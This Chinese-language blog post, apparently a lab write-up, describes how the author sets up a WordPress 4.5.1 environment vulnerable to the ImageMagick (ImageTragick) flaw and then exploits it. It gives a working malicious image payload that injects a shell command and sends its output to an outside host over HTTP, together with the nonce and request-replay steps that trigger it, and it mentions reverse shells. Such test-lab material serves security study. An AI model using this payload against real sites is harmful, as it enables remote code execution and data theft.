---
layout: post
title: "Wordpress ImageMagic漏洞测试环境搭建&amp;利用的心路历程"
date: 2016-06-17 17:33:02 +0800
author: tang3
comments: true
categories: 技术
tags: [Web漏洞]
---

最近工作上的原因需要搭建一个Wordpress的ImageMagic漏洞环境，搭建过程中遇到了一些头疼的问题，以及对于利用方法的一些思考，在这里总结一下。

## 环境搭建

我使用的是Ubuntu14.04 64位版，使用Ngnix+php5fmp+mysql搭建，Wordpress版本选择的是4.5.1。服务配置这里没什么说的，我们直接来看搭建需要注意的地方。

<!-- more -->

首先Wordpress需要关闭掉自动升级功能，否则被修复到无漏洞版本就尴尬了。在wp-confing.php文件最后添加如下一行代码，然后安装即可。

```php
define('AUTOMATIC_UPDATER_DISABLED',true);
```

后面就是ImageMagic的安装了，Ubuntu默认源中是修复了的版本，所以我们只能去找源码编译。找到合适的源码也是一件很蛋疼的事情，我最后是在[http://www.imagemagick.org/download/releases/](http://www.imagemagick.org/download/releases/)这里找到的版本，不过这里面有的版本在我的环境中编译总是会报错，最终我编译成功的是6.9.0.0这个版本。编译命令如下，需注意要指定一个明确的路径，以便于之后编译php的imagick插件时提供。

```sh
./configure --prefix=/usr/local/imagemagick
make
make install
```

之后下载php的imagick插件源码编译，这里我选择的是3.4.1版本，操作如下：

```sh
wget https://pecl.php.net/get/imagick-3.4.1.tgz
tar -zxvf imagick-3.4.1.tgz 
cd imagick-3.4.1/
phpize
./configure --prefix=/usr/local/imagick --with-php-config=/usr/bin/php-config  --with-imagick=/usr/local/imagemagick
make
make install
```

在php.ini中添加插件so重启php5fpm即可。phpinfo如下图所示：

![phpinfo](/assets/images/2016-06/06-17-phpinfo.png)

## Wordpress ImageMagic漏洞利用

在阅读ricter师傅的[文章](http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1?_=1466130906033)时，自己的理解有些问题，没太搞懂_ajax_nonce的意思，导致在测试漏洞时大部分时间用来找_ajax_nonce了。

通过作者或以上权限，提交一篇文章，并上传一张正常图片，通过编辑图片的功能可以获取该图片的postid，然后上传内容为以下内容的png图片，同样通过编辑图片功能可以获取该图片的postid和_ajax_nonce。

```php
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|php -r "file_get_contents(\"http://172.16.107.144/\".system(\"pwd\"));)'
pop graphic-context
```
这里关于_ajax_nonce的值，我翻看了一下代码，只要我们找到任意的image_editor这个action和恶意图片postid的_ajax_nonce就可以，因为他后台处理只用了这两个值。

![nonce](/assets/images/2016-06/06-17-nonce.png)

然后抓取正常图片任意编辑操作的提交（一般都是imgedit-preview的action），修改_ajax_nonce和post_id为攻击内图片，即可触发漏洞利用。

因为这个漏洞没有回显，所以一遍使用直接反弹shell的方法获取交互，但是由于反弹不是很稳定，这里建议使用上面恶意图片内容中给出的php执行访问自己网站并查看日志的方法来实现简单的交互。